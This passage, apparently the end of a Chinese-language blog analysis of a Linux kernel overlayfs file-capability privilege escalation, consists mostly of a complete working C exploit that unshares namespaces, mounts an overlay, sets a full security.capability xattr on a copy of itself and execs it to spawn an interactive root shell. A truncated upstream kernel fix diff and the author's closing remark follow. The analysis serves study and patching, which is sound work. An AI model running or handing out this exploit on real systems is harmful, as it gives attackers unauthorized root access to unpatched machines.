            _exit(exploit());
        } else {
            waitpid(child, NULL, 0); //父进程等待子进程执行exploit完成
        }
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);//执行具有权限的BIN_UPPER 也即
        err(1, "execl %s", BIN_UPPER);
此时具有权限的`./eki_ovlcap/upper/magic`进入如下判断语句块，通过`setuid(0);setgid(0);`提升权限并执行`/bin/bash`获取shell
        if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
            setuid(0);
            setgid(0);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            err(1, "execl /bin/bash");
        }
完整Exp如下
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    //#include 
    //#include 
    int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
    #define DIR_BASE    "./eki_ovlcap"
    #define DIR_WORK    DIR_BASE "/work"
    #define DIR_LOWER   DIR_BASE "/lower"
    #define DIR_UPPER   DIR_BASE "/upper"
    #define DIR_MERGE   DIR_BASE "/merge"
    #define BIN_MERGE   DIR_MERGE "/magic"
    #define BIN_UPPER   DIR_UPPER "/magic"
    static void writefile(const char *path, const char *data)
    {
        int fd = open(path, O_WRONLY);
        if (fd == -1)
            err(1, "open %s", path);
        ssize_t len = (ssize_t) strlen(data);
        if (write(fd, data, len) != len)
            err(1, "write %s", path);
        close(fd);
    }
    static void copyfile(const char *src, const char *dst, mode_t mode)
    {
        int fi, fo;
        if ((fi = open(src, O_RDONLY)) == -1)
            err(1, "open %s", src);
        if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
            err(1, "open %s", dst);
        char buf[4096];
        ssize_t rd, wr;
        for (;;) {
            rd = read(fi, buf, sizeof(buf));
            if (rd == 0) {
                break;
            } else if (rd == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "read %s", src);
            }
            char *p = buf;
            while (rd > 0) {
                wr = write(fo, p, rd);
                if (wr == -1) {
                    if (errno == EINTR)
                        continue;
                    err(1, "write %s", dst);
                }
                p += wr;
                rd -= wr;
            }
        }
        close(fi);
        close(fo);
    }
    static int exploit()
    {
        char buf[4096];
        sprintf(buf, "rm -rf '%s/'", DIR_BASE);
        system(buf);
        mkdir(DIR_BASE, 0777);
        mkdir(DIR_WORK,  0777);
        mkdir(DIR_LOWER, 0777);
        mkdir(DIR_UPPER, 0777);
        mkdir(DIR_MERGE, 0777);
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
            err(1, "unshare");
        writefile("/proc/self/setgroups", "deny");
        uid_t uid = getuid();
        gid_t gid = getgid();
        sprintf(buf, "0 %d 1", uid);
        writefile("/proc/self/uid_map", buf);
        sprintf(buf, "0 %d 1", gid);
        writefile("/proc/self/gid_map", buf);
        sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
        if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
            err(1, "mount %s", DIR_MERGE);
        // all+ep
        char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
        copyfile("/proc/self/exe", BIN_MERGE, 0777);
        if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
            err(1, "setxattr %s", BIN_MERGE);
        return 0;
    }
    int main(int argc, char *argv[])
    {
        if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
            setuid(0);
            setgid(0);
            execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            err(1, "execl /bin/bash");
        }
        pid_t child = fork();
        if (child == -1)
            err(1, "fork");
        if (child == 0) {
            _exit(exploit());
        } else {
            waitpid(child, NULL, 0);
        }
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
        err(1, "execl %s", BIN_UPPER);
    }
演示效果如下图
官方给出的修复方法是
    diff --git a/fs/xattr.c b/fs/xattr.c
    index cd7a563e8bcd4..fd57153b1f617 100644
    --- a/fs/xattr.c
    +++ b/fs/xattr.c
    @@ -276,8 +276,16 @@ vfs_setxattr(struct dentry *dentry, const char *name, const void *value,
     {
         struct inode *inode = dentry->d_inode;
         struct inode *delegated_inode = NULL;
    +    const void  *orig_value = value;
         int error;
    +    if (size && strcmp(name, XATTR_NAME_CAPS) == 0) {
    +        error = cap_convert_nscap(dentry, &value, size);
    +        if (error 
  * 
  * 
  * 
  * 
  * 
这是本人第一次分析Linux内核相关代码，如果在文中发现有什么问题，欢迎大家斧正